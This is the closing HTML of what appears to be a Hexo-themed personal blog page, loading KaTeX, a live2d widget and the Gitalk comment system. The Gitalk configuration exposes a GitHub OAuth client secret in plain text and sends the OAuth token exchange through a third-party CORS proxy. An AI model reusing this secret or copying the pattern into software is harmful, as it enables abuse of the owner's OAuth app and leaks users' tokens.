  <script src="/js/third-party/math/katex.js"></script>


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.7.2/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">

<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"TWe1v3# GitHub repo owner","repo":"TWe1v3-Blogcomment","client_id":"b1f12cb0fd210a7f001b# GitHub Application Client ID","client_secret":"80355aa1b174d1926079780262cdc80f1ca96516","admin_user":"TWe1v3","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":"zh-CN","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.7.2/gitalk.min.js","integrity":"sha256-Pmj85ojLaPOWwRtlMJwmezB/Qg8BzvJp5eTzvXaYAfA="},"path_md5":"fd659fb981d2c80239606256278c68d9"}</script>
<script src="/js/third-party/comments/gitalk.js"></script>


<script src="/live2d-widget/autoload.js"></script>
</body>
</html>
